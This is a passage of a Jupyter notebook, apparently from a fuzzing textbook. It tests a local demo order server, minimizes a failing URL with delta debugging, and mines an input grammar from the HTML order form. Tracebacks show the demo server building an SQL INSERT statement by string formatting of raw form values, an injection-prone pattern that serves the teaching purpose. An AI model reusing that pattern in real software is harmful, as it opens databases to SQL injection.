       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'name'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 90,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clear_httpd_messages()\n",
    "HTML(webbrowser(url))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "How does the URL cause this internal error?  We make use of [delta debugging](Reducer.ipynb) to minimize the failure-inducing path, setting up a `WebRunner` class to define the failure condition:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.603366Z",
     "iopub.status.busy": "2021-12-13T14:45:34.602769Z",
     "iopub.status.idle": "2021-12-13T14:45:34.605163Z",
     "shell.execute_reply": "2021-12-13T14:45:34.605618Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732'"
      ]
     },
     "execution_count": 91,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "failing_path = path\n",
    "failing_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.608933Z",
     "iopub.status.busy": "2021-12-13T14:45:34.608327Z",
     "iopub.status.idle": "2021-12-13T14:45:34.610258Z",
     "shell.execute_reply": "2021-12-13T14:45:34.610645Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Fuzzer import Runner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.616515Z",
     "iopub.status.busy": "2021-12-13T14:45:34.615625Z",
     "iopub.status.idle": "2021-12-13T14:45:34.618260Z",
     "shell.execute_reply": "2021-12-13T14:45:34.617687Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class WebRunner(Runner):\n",
    "    def __init__(self, base_url=None):\n",
    "        self.base_url = base_url\n",
    "\n",
    "    def run(self, url):\n",
    "        if self.base_url is not None:\n",
    "            url = urljoin(self.base_url, url)\n",
    "\n",
    "        import requests  # for imports\n",
    "        r = requests.get(url)\n",
    "        if r.status_code == HTTPStatus.OK:\n",
    "            return url, Runner.PASS\n",
    "        elif r.status_code == HTTPStatus.INTERNAL_SERVER_ERROR:\n",
    "            return url, Runner.FAIL\n",
    "        else:\n",
    "            return url, Runner.UNRESOLVED"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.622320Z",
     "iopub.status.busy": "2021-12-13T14:45:34.621628Z",
     "iopub.status.idle": "2021-12-13T14:45:34.628721Z",
     "shell.execute_reply": "2021-12-13T14:45:34.629234Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('http://127.0.0.1:8800/order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732',\n",
       " 'FAIL')"
      ]
     },
     "execution_count": 94,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_runner = WebRunner(httpd_url)\n",
    "web_runner.run(failing_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "This is the minimized path:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.632344Z",
     "iopub.status.busy": "2021-12-13T14:45:34.631744Z",
     "iopub.status.idle": "2021-12-13T14:45:35.444753Z",
     "shell.execute_reply": "2021-12-13T14:45:35.445232Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Reducer import DeltaDebuggingReducer  # minor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.448649Z",
     "iopub.status.busy": "2021-12-13T14:45:35.448112Z",
     "iopub.status.idle": "2021-12-13T14:45:35.519996Z",
     "shell.execute_reply": "2021-12-13T14:45:35.520468Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'order'"
      ]
     },
     "execution_count": 96,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "minimized_path = DeltaDebuggingReducer(web_runner).reduce(failing_path)\n",
    "minimized_path"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "It turns out that our server encounters an internal error if we do not supply the requested fields:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.524499Z",
     "iopub.status.busy": "2021-12-13T14:45:35.523914Z",
     "iopub.status.idle": "2021-12-13T14:45:35.526282Z",
     "shell.execute_reply": "2021-12-13T14:45:35.526783Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order'"
      ]
     },
     "execution_count": 97,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "minimized_url = urljoin(httpd_url, minimized_path)\n",
    "minimized_url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.530013Z",
     "iopub.status.busy": "2021-12-13T14:45:35.529432Z",
     "iopub.status.idle": "2021-12-13T14:45:35.539721Z",
     "shell.execute_reply": "2021-12-13T14:45:35.540095Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] \"GET /order HTTP/1.1\" 500 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>Traceback (most recent call last):\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/739974898.py\", line 8, in do_GET\n",
       "    self.handle_order()\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1342827050.py\", line 4, in handle_order\n",
       "    self.store_order(values)\n",
       "  File \"/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_96174/1382513861.py\", line 5, in store_order\n",
       "    sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
       "KeyError: 'item'\n",
       "</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 98,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "clear_httpd_messages()\n",
    "HTML(webbrowser(minimized_url))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We see that we might have a lot to do to make our Web server more robust against unexpected inputs.  The [exercises](#Exercises) give some instructions on what to do."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Extracting Grammars for Input Forms\n",
    "\n",
    "In our previous examples, we have assumed that we have a grammar that produces valid (or less valid) order queries.  However, such a grammar does not need to be specified manually; we can also _extract it automatically_ from a Web page at hand.  This way, we can apply our test generators on arbitrary Web forms without a manual specification step."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Searching HTML for Input Fields\n",
    "\n",
    "The key idea of our approach is to identify all input fields in a form.  To this end, let us take a look at how the individual elements in our order form are encoded in HTML:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.544106Z",
     "iopub.status.busy": "2021-12-13T14:45:35.543435Z",
     "iopub.status.idle": "2021-12-13T14:45:35.550570Z",
     "shell.execute_reply": "2021-12-13T14:45:35.550984Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:35] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
      "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
      "  <p>\n",
      "  Yes! Please send me at your earliest convenience\n",
      "  <select name=\"item\">\n",
      "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
      "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
      "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
      "\n",
      "  </select>\n",
      "  <br>\n",
      "  <table>\n",
      "  <tr><td>\n",
      "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
      "  </td><td>\n",
      "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
      "  </td></tr>\n",
      "  <tr><td>\n",
      "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
      "  </td><td>\n",
      "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
      "  </tr></tr>\n",
      "  </table>\n",
      "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
      "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
      "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
      "</p>\n",
      "</form>\n"
     ]
    }
   ],
   "source": [
    "html_text = webbrowser(httpd_url)\n",
    "print(html_text[html_text.find(\"<form\"):html_text.find(\"</form>\") + len(\"</form>\")])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "We see that there is a number of form elements that accept inputs, in particular `<input>`, but also `<select>` and `<option>`.  The idea now is to _parse_ the HTML of the Web page in question, to extract these individual input elements, and then to create a _grammar_ that produces a matching URL, effectively filling out the form."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To parse the HTML page, we could define a grammar to parse HTML and make use of [our own parser infrastructure](Parser.ipynb).  However, it is much easier to not reinvent the wheel and instead build on the existing, dedicated `HTMLParser` class from the Python library."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.554965Z",
     "iopub.status.busy": "2021-12-13T14:45:35.554385Z",
     "iopub.status.idle": "2021-12-13T14:45:35.556893Z",
     "shell.execute_reply": "2021-12-13T14:45:35.557485Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from html.parser import HTMLParser"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "During parsing, we search for `<form>` tags and save the associated action (i.e., the URL to be invoked when the form is submitted) in the `action` attribute.  While processing the form, we create a map `fields` that holds all input fields we have seen; it maps field names to the respective HTML input types (`\"text\"`, `\"number\"`, `\"checkbox\"`, etc.).  Exclusive selection options map to a list of possible values; the `select` stack holds the currently active selection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.561472Z",
     "iopub.status.busy": "2021-12-13T14:45:35.560942Z",
     "iopub.status.idle": "2021-12-13T14:45:35.562628Z",
     "shell.execute_reply": "2021-12-13T14:45:35.563013Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(HTMLParser):\n",
    "    def reset(self):\n",
    "        super().reset()\n",
    "        self.action = \"\"  # Form action\n",
    "        # Map of field name to type (or selection name to [option_1, option_2,\n",
    "        # ...])\n",
    "        self.fields = {}\n",
    "        self.select = []  # Stack of currently active selection names"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "While parsing, the parser calls `handle_starttag()` for every opening tag (such as `<form>`) found; conversely, it invokes `handle_endtag()` for closing tags (such as `</form>`).  `attributes` gives us a map of associated attributes and values.\n",
    "\n",
    "Here is how we process the individual tags:\n",
    "* When we find a `<form>` tag, we save the associated action in the `action` attribute;\n",
    "* When we find an `<input>` tag or similar, we save the type in the `fields` attribute;\n",
    "* When we find a `<select>` tag  or similar, we push its name on the `select` stack;\n",
    "* When we find an `<option>` tag, we append the option to the list associated with the last pushed `<select>` tag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.569473Z",
     "iopub.status.busy": "2021-12-13T14:45:35.568851Z",
     "iopub.status.idle": "2021-12-13T14:45:35.570438Z",
     "shell.execute_reply": "2021-12-13T14:45:35.570806Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(FormHTMLParser):\n",
    "    def handle_starttag(self, tag, attrs):\n",
    "        attributes = {attr_name: attr_value for attr_name, attr_value in attrs}\n",
    "        # print(tag, attributes)\n",
    "\n",
    "        if tag == \"form\":\n",
    "            self.action = attributes.get(\"action\", \"\")\n",
    "\n",
    "        elif tag == \"select\" or tag == \"datalist\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = []\n",
    "                self.select.append(name)\n",
    "            else:\n",
    "                self.select.append(None)\n",
    "\n",
    "        elif tag == \"option\" and \"multiple\" not in attributes:\n",
    "            current_select_name = self.select[-1]\n",
    "            if current_select_name is not None and \"value\" in attributes:\n",
    "                self.fields[current_select_name].append(attributes[\"value\"])\n",
    "\n",
    "        elif tag == \"input\" or tag == \"option\" or tag == \"textarea\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = attributes.get(\"type\", \"text\")\n",
    "\n",
    "        elif tag == \"button\":\n",
    "            if \"name\" in attributes:\n",
    "                name = attributes[\"name\"]\n",
    "                self.fields[name] = [\"\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 103,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.575101Z",
     "iopub.status.busy": "2021-12-13T14:45:35.574322Z",
     "iopub.status.idle": "2021-12-13T14:45:35.576401Z",
     "shell.execute_reply": "2021-12-13T14:45:35.576978Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class FormHTMLParser(FormHTMLParser):\n",
    "    def handle_endtag(self, tag):\n",
    "        if tag == \"select\":\n",
    "            self.select.pop()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Our implementation handles only one form per Web page; it also works on HTML only, ignoring all interaction coming from JavaScript.  Also, it does not support all HTML input types."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us put this parser to action.  We create a class `HTMLGrammarMiner` that takes a HTML document to parse.  It then returns the associated action and the associated fields:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.581070Z",
     "iopub.status.busy": "2021-12-13T14:45:35.580534Z",
     "iopub.status.idle": "2021-12-13T14:45:35.582174Z",
     "shell.execute_reply": "2021-12-13T14:45:35.582608Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner:\n",
    "    def __init__(self, html_text):\n",
    "        html_parser = FormHTMLParser()\n",
    "        html_parser.feed(html_text)\n",
    "        self.fields = html_parser.fields\n",
    "        self.action = html_parser.action"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Applied on our order form, this is what we get:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 105,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.586755Z",
     "iopub.status.busy": "2021-12-13T14:45:35.586179Z",
     "iopub.status.idle": "2021-12-13T14:45:35.588580Z",
     "shell.execute_reply": "2021-12-13T14:45:35.589124Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order'"
      ]
     },
     "execution_count": 105,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner = HTMLGrammarMiner(html_text)\n",
    "html_miner.action"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 106,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.593514Z",
     "iopub.status.busy": "2021-12-13T14:45:35.592831Z",
     "iopub.status.idle": "2021-12-13T14:45:35.595403Z",
     "shell.execute_reply": "2021-12-13T14:45:35.595802Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'item': ['tshirt', 'drill', 'lockset'],\n",
       " 'name': 'text',\n",
       " 'email': 'email',\n",
       " 'city': 'text',\n",
       " 'zip': 'number',\n",
       " 'terms': 'checkbox',\n",
       " 'submit': 'submit'}"
      ]
     },
     "execution_count": 106,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner.fields"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "From this structure, we can now generate a grammar that automatically produces valid form submission URLs."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Mining Grammars for Web Pages"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To create a grammar from the fields extracted from HTML, we build on the `CGI_GRAMMAR` defined in the [chapter on grammars](Grammars.ipynb).  The key idea is to define rules for every HTML input type: An HTML `number` type will get values from the `<number>` rule; likewise, values for the HTML `email` type will be defined from the `<email>` rule.  Our default grammar provides very simple rules for these types."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.599323Z",
     "iopub.status.busy": "2021-12-13T14:45:35.598751Z",
     "iopub.status.idle": "2021-12-13T14:45:35.600601Z",
     "shell.execute_reply": "2021-12-13T14:45:35.601043Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import crange, srange, new_symbol, unreachable_nonterminals, CGI_GRAMMAR, extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 108,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.606246Z",
     "iopub.status.busy": "2021-12-13T14:45:35.605612Z",
     "iopub.status.idle": "2021-12-13T14:45:35.607641Z",
     "shell.execute_reply": "2021-12-13T14:45:35.608144Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner(HTMLGrammarMiner):\n",
    "    QUERY_GRAMMAR = extend_grammar(CGI_GRAMMAR, {\n",
    "        \"<start>\": [\"<action>?<query>\"],\n",
    "\n",
    "        \"<text>\": [\"<string>\"],\n",
    "\n",
    "        \"<number>\": [\"<digits>\"],\n",
    "        \"<digits>\": [\"<digit>\", \"<digits><digit>\"],\n",
    "        \"<digit>\": crange('0', '9'),\n",
    "\n",
    "        \"<checkbox>\": [\"<_checkbox>\"],\n",
    "        \"<_checkbox>\": [\"on\", \"off\"],\n",
    "\n",
    "        \"<email>\": [\"<_email>\"],\n",
    "        \"<_email>\": [cgi_encode(\"<string>@<string>\", \"<>\")],\n",
    "\n",
    "        # Use a fixed password in case we need to repeat it\n",
    "        \"<password>\": [\"<_password>\"],\n",
    "        \"<_password>\": [\"abcABC.123\"],\n",
    "\n",
    "        # Stick to printable characters to avoid logging problems\n",
    "        \"<percent>\": [\"%<hexdigit-1><hexdigit>\"],\n",
    "        \"<hexdigit-1>\": srange(\"34567\"),\n",
    "        \n",
    "        # Submissions:\n",
    "        \"<submit>\": [\"\"]\n",
    "    })"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Our grammar miner now takes the fields extracted from HTML, converting them into rules.  Essentially, every input field encountered gets included in the resulting query URL; and it gets a rule expanding it into the appropriate type."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 109,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.615151Z",
     "iopub.status.busy": "2021-12-13T14:45:35.614239Z",
     "iopub.status.idle": "2021-12-13T14:45:35.616364Z",
     "shell.execute_reply": "2021-12-13T14:45:35.616856Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class HTMLGrammarMiner(HTMLGrammarMiner):\n",
    "    def mine_grammar(self):\n",
    "        grammar = extend_grammar(self.QUERY_GRAMMAR)\n",
    "        grammar[\"<action>\"] = [self.action]\n",
    "\n",
    "        query = \"\"\n",
    "        for field in self.fields:\n",
    "            field_symbol = new_symbol(grammar, \"<\" + field + \">\")\n",
    "            field_type = self.fields[field]\n",
    "\n",
    "            if query != \"\":\n",
    "                query += \"&\"\n",
    "            query += field_symbol\n",
    "\n",
    "            if isinstance(field_type, str):\n",
    "                field_type_symbol = \"<\" + field_type + \">\"\n",
    "                grammar[field_symbol] = [field + \"=\" + field_type_symbol]\n",
    "                if field_type_symbol not in grammar:\n",
    "                    # Unknown type\n",
    "                    grammar[field_type_symbol] = [\"<text>\"]\n",
    "            else:\n",
    "                # List of values\n",
    "                value_symbol = new_symbol(grammar, \"<\" + field + \"-value>\")\n",
    "                grammar[field_symbol] = [field + \"=\" + value_symbol]\n",
    "                grammar[value_symbol] = field_type\n",
    "\n",
    "        grammar[\"<query>\"] = [query]\n",
    "\n",
    "        # Remove unused parts\n",
    "        for nonterminal in unreachable_nonterminals(grammar):\n",
    "            del grammar[nonterminal]\n",
    "\n",
    "        assert is_valid_grammar(grammar)\n",
    "\n",
    "        return grammar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us show `HTMLGrammarMiner` in action, again applied on our order form.  Here is the full resulting grammar:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.624478Z",
     "iopub.status.busy": "2021-12-13T14:45:35.623725Z",
     "iopub.status.idle": "2021-12-13T14:45:35.627025Z",
     "shell.execute_reply": "2021-12-13T14:45:35.627474Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'<start>': ['<action>?<query>'],\n",
       " '<string>': ['<letter>', '<letter><string>'],\n",
       " '<letter>': ['<plus>', '<percent>', '<other>'],\n",
       " '<plus>': ['+'],\n",
       " '<percent>': ['%<hexdigit-1><hexdigit>'],\n",
       " '<hexdigit>': ['0',\n",
       "  '1',\n",
       "  '2',\n",
       "  '3',\n",
       "  '4',\n",
       "  '5',\n",
       "  '6',\n",
       "  '7',\n",
       "  '8',\n",
       "  '9',\n",
       "  'a',\n",
       "  'b',\n",
       "  'c',\n",
       "  'd',\n",
       "  'e',\n",
       "  'f'],\n",
       " '<other>': ['0', '1', '2', '3', '4', '5', 'a', 'b', 'c', 'd', 'e', '-', '_'],\n",
       " '<text>': ['<string>'],\n",
       " '<number>': ['<digits>'],\n",
       " '<digits>': ['<digit>', '<digits><digit>'],\n",
       " '<digit>': ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],\n",
       " '<checkbox>': ['<_checkbox>'],\n",
       " '<_checkbox>': ['on', 'off'],\n",
       " '<email>': ['<_email>'],\n",
       " '<_email>': ['<string>%40<string>'],\n",
       " '<hexdigit-1>': ['3', '4', '5', '6', '7'],\n",
       " '<submit>': [''],\n",
       " '<action>': ['/order'],\n",
       " '<item>': ['item=<item-value>'],\n",
       " '<item-value>': ['tshirt', 'drill', 'lockset'],\n",
       " '<name>': ['name=<text>'],\n",
       " '<email-1>': ['email=<email>'],\n",
       " '<city>': ['city=<text>'],\n",
       " '<zip>': ['zip=<number>'],\n",
       " '<terms>': ['terms=<checkbox>'],\n",
       " '<submit-1>': ['submit=<submit>'],\n",
       " '<query>': ['<item>&<name>&<email-1>&<city>&<zip>&<terms>&<submit-1>']}"
      ]
     },
     "execution_count": 110,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_miner = HTMLGrammarMiner(html_text)\n",
    "grammar = html_miner.mine_grammar()\n",
    "grammar"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us take a look into the structure of the grammar.  It produces URL paths of this form:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.631314Z",
     "iopub.status.busy": "2021-12-13T14:45:35.630661Z",
     "iopub.status.idle": "2021-12-13T14:45:35.633041Z",
     "shell.execute_reply": "2021-12-13T14:45:35.633406Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<action>?<query>']"
      ]
     },
     "execution_count": 111,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<start>\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here, the `<action>` comes from the `action` attribute of the HTML form:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:35.637002Z",
     "iopub.status.busy": "2021-12-13T14:45:35.636373Z",
     "iopub.status.idle": "2021-12-13T14:45:35.638779Z",
     "shell.execute_reply": "2021-12-13T14:45:35.639190Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['/order']"
      ]
     },
     "execution_count": 112,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "grammar[\"<action>\"]"
   ]
  },
  {
